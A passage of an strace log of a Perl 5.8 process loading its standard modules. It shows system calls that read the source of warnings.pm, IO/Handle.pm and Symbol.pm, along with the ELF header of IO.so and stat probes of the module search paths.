\'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
10562 07:33:34.983255 brk(0x81b6000)    = 0x81b6000
10562 07:33:34.983300 brk(0x81b5000)    = 0x81b5000
10562 07:33:34.983433 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
10562 07:33:34.983926 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
10562 07:33:34.984629 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
10562 07:33:34.984809 read(8, "", 4096) = 0
10562 07:33:34.984825 close(8)          = 0
10562 07:33:34.984992 _llseek(6, 412, [412], SEEK_SET) = 0
10562 07:33:34.985008 _llseek(6, 0, [412], SEEK_CUR) = 0
10562 07:33:34.985018 close(6)          = 0
10562 07:33:34.985059 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
10562 07:33:34.985082 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10562 07:33:34.985113 futex(0xb7ee3070, 0x81 /* FUTEX_??? */, 2147483647) = 0
10562 07:33:34.985129 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
10562 07:33:34.985143 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10562 07:33:34.985230 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
10562 07:33:34.985255 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7ee7000
10562 07:33:34.985261 mmap2(0xb7eeb000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7eeb000
10562 07:33:34.985261 close(6)          = 0
10562 07:33:34.985261 stat64("/etc/perl/IO/Handle.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985261 stat64("/etc/perl/IO/Handle.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985262 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985268 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985282 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985295 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985309 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985321 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985334 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985346 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985359 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985371 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
10562 07:33:34.985392 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
10562 07:33:34.985406 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5e38) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.985418 _llseek(6, 0, [0], SEEK_CUR) = 0
10562 07:33:34.985446 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
10562 07:33:34.985833 stat64("/etc/perl/Symbol.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985849 stat64("/etc/perl/Symbol.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985862 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985875 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985892 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985904 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985918 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985938 stat64("/usr/lib/perl5/Symbol.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985982 stat64("/usr/share/perl5/Symbol.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.985994 stat64("/usr/share/perl5/Symbol.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986024 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986036 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986049 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.986062 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
10562 07:33:34.986082 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:34.986096 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.986107 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:34.986125 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ 